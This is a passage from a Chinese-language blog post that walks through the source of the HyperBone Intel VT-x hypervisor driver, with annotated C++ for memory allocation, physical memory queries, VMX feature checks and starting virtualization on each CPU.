class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Allocate global data</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Allocated data or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PGLOBAL_DATA <span class="title">AllocGlobalData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VCPU代表虚拟中央处理单元（Virtual Central Processing Unit），也称为逻辑处理器。</span></span><br><span class="line"><span class="comment">    它是在虚拟化环境中为虚拟机创建的一种模拟的CPU。</span></span><br><span class="line"><span class="comment">    每个虚拟机可以有一个或多个VCPU，它们负责执行虚拟机中的指令和处理计算任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    EPT代表扩展页面表（Extended Page Table）。</span></span><br><span class="line"><span class="comment">    EPT是Intel处理器中的一种硬件技术，</span></span><br><span class="line"><span class="comment">    用于虚拟地址到物理地址的转换。在虚拟化环境中，EPT用于管理虚拟机中的内存访问，</span></span><br><span class="line"><span class="comment">    实现虚拟机之间和虚拟机与宿主操作系统之间的地址隔离和保护。</span></span><br><span class="line"><span class="comment">    EPT表存储了虚拟地址与物理地址之间的映射关系。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Page表示内存页，是计算机系统中内存管理的最小单位。在常见的架构中，一个页面的大小通常为4KB。</span></span><br><span class="line"><span class="comment">    内存页被用于分配和管理内存，用于存储程序指令和数据。</span></span><br><span class="line"><span class="comment">    在这段代码中，Page指的是用于存储EPT表的一块连续的内存页。</span></span><br><span class="line"><span class="comment">    通过预分配这些页面并将页面地址存储在VCPU的EPT.Pages数组中，来管理EPT表的相关信息。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    PHYSICAL_ADDRESS low = &#123; <span class="number">0</span> &#125;, high = &#123; <span class="number">0</span> &#125;;<span class="comment">// 物理地址</span></span><br><span class="line">    high.QuadPart = MAXULONG64;<span class="comment">// 最大的64位ULONG</span></span><br><span class="line"></span><br><span class="line">    ULONG cpu_count = <span class="built_in">KeQueryActiveProcessorCountEx</span>( ALL_PROCESSOR_GROUPS );<span class="comment">// 当前CPU数量</span></span><br><span class="line">    ULONG_PTR size = <span class="built_in">FIELD_OFFSET</span>( GLOBAL_DATA, cpu_data ) + cpu_count * <span class="built_in">sizeof</span>( VCPU );<span class="comment">// 计算全局数据结构大小</span></span><br><span class="line">    <span class="comment">// 在非分页池中分配内存，大小为size</span></span><br><span class="line">    PGLOBAL_DATA pData = (PGLOBAL_DATA)<span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, size, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pData == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( pData, size );<span class="comment">// 将分配的内存清零</span></span><br><span class="line">    <span class="comment">// 在非分页池中分配内存，大小为一页，存储MSR寄存器位图</span></span><br><span class="line">    pData-&gt;MSRBitmap = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, PAGE_SIZE, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pData-&gt;MSRBitmap == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 分配失败，释放空间</span></span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pData, HB_POOL_TAG );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( pData-&gt;MSRBitmap, PAGE_SIZE );</span><br><span class="line">    <span class="comment">// 获取CPU制造商信息</span></span><br><span class="line">    pData-&gt;CPUVendor = <span class="built_in">UtilCPUVendor</span>();</span><br><span class="line">    <span class="comment">// 遍历cpu_data数组，对VCPU进行初始化</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; cpu_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PVCPU Vcpu = &amp;pData-&gt;cpu_data[i];</span><br><span class="line">        <span class="comment">// 初始化VCPU中的页链表</span></span><br><span class="line">        <span class="built_in">InitializeListHead</span>( &amp;Vcpu-&gt;EPT.PageList );</span><br><span class="line">        <span class="comment">// 循环预分配EPT页面</span></span><br><span class="line">        <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; EPT_PREALLOC_PAGES; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 分配一个连续页面</span></span><br><span class="line">            Vcpu-&gt;EPT.Pages[j] = <span class="built_in">MmAllocateContiguousMemorySpecifyCache</span>( PAGE_SIZE, low, high, low, MmNonCached );</span><br><span class="line">            <span class="keyword">if</span> (Vcpu-&gt;EPT.Pages[j] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 设置页面为可读写</span></span><br><span class="line">                <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;EPT.Pages[j], PAGE_SIZE, PAGE_READWRITE );</span><br><span class="line">                <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;EPT.Pages[j], PAGE_SIZE );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获取物理内存信息"><a href="#获取物理内存信息" class="headerlink" title="获取物理内存信息"></a>获取物理内存信息</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gather info about used physical pages</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">UtilQueryPhysicalMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Memory != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取物理内存范围信息</span></span><br><span class="line">    PPHYSICAL_MEMORY_RANGE pBaseRange = <span class="built_in">MmGetPhysicalMemoryRanges</span>();</span><br><span class="line">    <span class="keyword">if</span> (pBaseRange == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历链表，计算物理内存页面数目pageCount和区域数量runsCount</span></span><br><span class="line">    ULONG runsCount = <span class="number">0</span>, pageCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (PPHYSICAL_MEMORY_RANGE pRange = pBaseRange; pRange-&gt;NumberOfBytes.QuadPart != <span class="number">0</span>; pRange++)</span><br><span class="line">    &#123;</span><br><span class="line">        pageCount += (ULONG)<span class="built_in">PFN</span>( pRange-&gt;NumberOfBytes.QuadPart );</span><br><span class="line">        runsCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    APIC（Advanced Programmable Interrupt Controller）是一种高级可编程中断控制器，用于处理中断和异常。</span></span><br><span class="line"><span class="comment">    它是一种在计算机体系结构中实现中断控制的硬件设备。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在多核处理器系统中，每个核心都有自己的本地 APIC。本地 APIC 负责接收和处理与该核心相关的中断，并将其分发给适当的处理器。</span></span><br><span class="line"><span class="comment">    此外，还有一个 I/O APIC，负责管理外部设备的中断信号以及将它们分发给适当的处理器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    APIC 提供了一种灵活和可扩展的方式来管理和处理中断，使得系统能够高效地响应各种设备和事件引起的中断请求。</span></span><br><span class="line"><span class="comment">    它支持优先级、屏蔽、中断分发和处理、中断共享等功能，能够提高系统的可靠性和性能。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    APIC 物理页是指用于存储 APIC 相关数据结构的物理内存页。在x86 架构的计算机系统中，</span></span><br><span class="line"><span class="comment">    APIC 物理页通常位于物理内存的固定地址上，</span></span><br><span class="line"><span class="comment">    并用于存储本地 APIC、I/O APIC 和其他与 APIC 相关的寄存器和数据结构。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取APIC物理页信息</span></span><br><span class="line">    IA32_APIC_BASE apic = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    apic.All = __readmsr( MSR_APIC_BASE );<span class="comment">// IA32_APIC_BASE寄存器的值</span></span><br><span class="line">    runsCount += <span class="number">2</span>;<span class="comment">// 添加到 runsCount 中</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算Memory需要的大小，并为全局变量分配内存</span></span><br><span class="line">    ULONG size =  <span class="built_in">sizeof</span>( PPHYSICAL_MEMORY_DESCRIPTOR ) + runsCount * <span class="built_in">sizeof</span>( PHYSICAL_MEMORY_RUN );</span><br><span class="line">    g_Data-&gt;Memory = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, size, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Memory != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>( g_Data-&gt;Memory, size );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将物理内存范围信息复制到全局变量中，设置每个范围的起始页和页面数目</span></span><br><span class="line">        g_Data-&gt;Memory-&gt;NumberOfPages = pageCount;</span><br><span class="line">        g_Data-&gt;Memory-&gt;NumberOfRuns  = runsCount;</span><br><span class="line"></span><br><span class="line">        runsCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (PPHYSICAL_MEMORY_RANGE pRange = pBaseRange; pRange-&gt;BaseAddress.QuadPart != <span class="number">0</span>; pRange++, runsCount++)</span><br><span class="line">        &#123;</span><br><span class="line">            g_Data-&gt;Memory-&gt;Run[runsCount].BasePage  = <span class="built_in">PFN</span>( pRange-&gt;BaseAddress.QuadPart );</span><br><span class="line">            g_Data-&gt;Memory-&gt;Run[runsCount].PageCount = <span class="built_in">PFN</span>( pRange-&gt;NumberOfBytes.QuadPart );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加用于存储APIC的单个页</span></span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount].BasePage  = apic.Fields.Apic_base;</span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount].PageCount = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 添加从0xF0000000共计0x10000页面的保留页</span></span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount + <span class="number">1</span>].BasePage = <span class="built_in">PFN</span>( <span class="number">0xF0000000</span> );</span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount + <span class="number">1</span>].PageCount = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">ExFreePool</span>( pBaseRange );</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ExFreePool</span>( pBaseRange );</span><br><span class="line">    <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="释放全局变量"><a href="#释放全局变量" class="headerlink" title="释放全局变量"></a>释放全局变量</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Free global data</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pData&quot;&gt;Data pointer&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">FreeGlobalData</span><span class="params">( IN PGLOBAL_DATA pData )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pData == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前系统中活动处理器的数量</span></span><br><span class="line">    ULONG cpu_count = <span class="built_in">KeQueryActiveProcessorCountEx</span>( ALL_PROCESSOR_GROUPS );</span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; cpu_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//访问Vcpu数组成员，释放VMXON、VMCS、VMMStack和EPT.Pages数据结构内存</span></span><br><span class="line">        PVCPU Vcpu = &amp;pData-&gt;cpu_data[i];</span><br><span class="line">        <span class="keyword">if</span> (Vcpu-&gt;VMXON)</span><br><span class="line">            <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMXON );</span><br><span class="line">        <span class="keyword">if</span> (Vcpu-&gt;VMCS)</span><br><span class="line">            <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMCS );</span><br><span class="line">        <span class="keyword">if</span> (Vcpu-&gt;VMMStack)</span><br><span class="line">            <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMMStack );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; EPT_PREALLOC_PAGES; j++)</span><br><span class="line">            <span class="keyword">if</span> (Vcpu-&gt;EPT.Pages[j] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;EPT.Pages[j] );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放物理内存和MSR位图内存</span></span><br><span class="line">    <span class="keyword">if</span> (pData-&gt;Memory)</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pData-&gt;Memory, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pData-&gt;MSRBitmap)</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pData-&gt;MSRBitmap, HB_POOL_TAG );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存池内存</span></span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>( pData, HB_POOL_TAG );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="检查CPU虚拟化特性"><a href="#检查CPU虚拟化特性" class="headerlink" title="检查CPU虚拟化特性"></a>检查CPU虚拟化特性</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// CPU virtualization features</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">HvmCheckFeatures</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPU_VENDOR vendor = <span class="built_in">UtilCPUVendor</span>();</span><br><span class="line">    <span class="keyword">if</span> (vendor == CPU_Intel)</span><br><span class="line">        <span class="built_in">VmxCheckFeatures</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="检查并记录相应的CPU虚拟化特性"><a href="#检查并记录相应的CPU虚拟化特性" class="headerlink" title="检查并记录相应的CPU虚拟化特性"></a>检查并记录相应的CPU虚拟化特性</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Check various VMX features: EPT, VPID, VMFUNC, etc.</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxCheckFeatures</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IA32_VMX_BASIC_MSR basic = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IA32_VMX_PROCBASED_CTLS_MSR ctl = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IA32_VMX_PROCBASED_CTLS2_MSR ctl2 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IA32_VMX_EPT_VPID_CAP_MSR vpidcap = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// True MSRs</span></span><br><span class="line">    basic.All = __readmsr( MSR_IA32_VMX_BASIC );<span class="comment">// 读取MSR_IA32_VMX_BASIC寄存器</span></span><br><span class="line">    g_Data-&gt;Features.TrueMSRs = basic.Fields.VmxCapabilityHint;<span class="comment">// 检查硬件直接提供的真实MSR</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Secondary control</span></span><br><span class="line">    ctl.All = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS );</span><br><span class="line">    g_Data-&gt;Features.SecondaryControls = ctl.Fields.ActivateSecondaryControl;<span class="comment">// 检查是否支持次级控制</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Secondary control（次级控制）是指在虚拟化环境中，</span></span><br><span class="line"><span class="comment">    用于控制虚拟机对处理器部分功能的访问和使用的一组寄存器或设置。</span></span><br><span class="line"><span class="comment">    在虚拟化技术中，虚拟机监视器（VMM）负责管理和控制虚拟机，包括对处理器的访问和配置。</span></span><br><span class="line"><span class="comment">    为了实现安全的虚拟化环境，处理器提供了一些特殊的次级控制寄存器或标志位，</span></span><br><span class="line"><span class="comment">    用于限制虚拟机的某些操作或行为，以防止虚拟机绕过VMM直接访问处理器的敏感功能或破坏虚拟化隔离。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctl.Fields.ActivateSecondaryControl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//检查 EPT, VPID, VMFUNC</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        EPT（Extended Page Tables）：EPT是Intel VT-x虚拟化技术中的一项功能，</span></span><br><span class="line"><span class="comment">        它允许在虚拟机监控程序（VMM）和虚拟机（VM）之间进行内存管理。</span></span><br><span class="line"><span class="comment">        EPT使用了额外的页表层级，将虚拟地址转换为物理地址，并提供了更高效的内存虚拟化支持。</span></span><br><span class="line"><span class="comment">        EPT可以提高虚拟机的性能和隔离性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        VPID（Virtual Processor Identifier）：VPID是Intel VT-x虚拟化技术中的一个特性，</span></span><br><span class="line"><span class="comment">        用于改进虚拟机切换时的TLB（Translation Lookaside Buffer）缓存效率。</span></span><br><span class="line"><span class="comment">        每个虚拟机都被分配一个唯一的VPID，当虚拟机切换时，可以保留TLB中与新虚拟机关联的页表条目，</span></span><br><span class="line"><span class="comment">        加速虚拟机的上下文切换。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        VMFUNC（VM Functions）：VMFUNC是Intel VT-x虚拟化技术中的一项功能，</span></span><br><span class="line"><span class="comment">        它允许虚拟机中的代码调用一些特殊的处理器功能。</span></span><br><span class="line"><span class="comment">        通过VMFUNC，虚拟机可以执行一些特权指令，包括对虚拟化扩展的访问控制、访问虚拟机控制结构等。</span></span><br><span class="line"><span class="comment">        VMFUNC使得虚拟化软件可以更加灵活地扩展和控制虚拟机的功能。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        ctl2.All = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS2 );</span><br><span class="line">        g_Data-&gt;Features.EPT  = ctl2.Fields.EnableEPT;</span><br><span class="line">        g_Data-&gt;Features.VPID = ctl2.Fields.EnableVPID;</span><br><span class="line">        g_Data-&gt;Features.VMFUNC = ctl2.Fields.EnableVMFunctions;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ctl2.Fields.EnableEPT != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Execute only</span></span><br><span class="line">            vpidcap.All = __readmsr( MSR_IA32_VMX_EPT_VPID_CAP );</span><br><span class="line">            g_Data-&gt;Features.ExecOnlyEPT = vpidcap.Fields.ExecuteOnly;</span><br><span class="line">            g_Data-&gt;Features.InvSingleAddress = vpidcap.Fields.IndividualAddressInvVpid;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (vpidcap.Fields.ExecuteOnly == <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No execute-only EPT translation support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No EPT/VPID support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No secondary contol support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="HVM与VMX"><a href="#HVM与VMX" class="headerlink" title="HVM与VMX"></a>HVM与VMX</h1><p>VMX代表虚拟机扩展（Virtual Machine Extensions），是Intel处理器提供的硬件虚拟化技术。通过VMX，处理器可以在同一个物理主机上同时运行多个虚拟机，每个虚拟机都能拥有自己的操作系统和应用程序，并且相互之间是隔离的。</p><p>HVM代表硬件辅助虚拟化（Hardware-assisted Virtualization），是一种虚拟化技术。它利用处理器中的硬件特性来提高虚拟化的性能和效率。HVM通常与VMX结合使用，以实现更快速、更可靠的虚拟化环境。</p><p>简而言之，VMX指的是Intel处理器提供的硬件虚拟化技术，而HVM则是一种利用硬件辅助虚拟化的技术。这两者都是为了实现高效、安全的虚拟化环境而存在的。</p><h1 id="开启虚拟化"><a href="#开启虚拟化" class="headerlink" title="开启虚拟化"></a>开启虚拟化</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Virtualize each CPU</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">StartHV</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Unknown CPU</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;CPUVendor == CPU_Other)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_SUPPORTED;<span class="comment">// 不支持</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">KeGenericCallDpc</span>( HvmpHVCallbackDPC, (PVOID)__readcr3() );<span class="comment">// 读取CR3寄存器的值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some CPU failed</span></span><br><span class="line">    ULONG count = <span class="built_in">KeQueryActiveProcessorCountEx</span>( ALL_PROCESSOR_GROUPS );<span class="comment">// 查询活动处理器的数量</span></span><br><span class="line">    <span class="keyword">if</span> (count != (ULONG)g_Data-&gt;vcpus)<span class="comment">// 活动处理器的数量不等于虚拟处理器的数量</span></span><br><span class="line">    &#123;<span class="comment">// 有处理器失败，停止虚拟化并返回失败</span></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Some CPU failed to subvert\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="built_in">StopHV</span>();</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DPC回调进行虚拟化处理"><a href="#DPC回调进行虚拟化处理" class="headerlink" title="DPC回调进行虚拟化处理"></a>DPC回调进行虚拟化处理</h2><figure class="highlight c++"><table><tr><td 